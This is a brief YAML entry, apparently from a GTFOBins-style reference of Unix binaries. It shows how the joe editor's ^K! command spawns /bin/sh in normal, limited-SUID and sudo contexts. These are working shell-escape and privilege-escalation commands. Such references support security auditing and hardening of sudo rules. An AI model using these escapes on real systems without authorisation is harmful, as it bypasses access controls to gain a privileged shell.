---
functions:
  shell:
    - code: |
        joe
        ^K!/bin/sh
  limited-suid:
    - code: |
        ./joe
        ^K!/bin/sh
  sudo:
    - code: |
        sudo joe
        ^K!/bin/sh
---
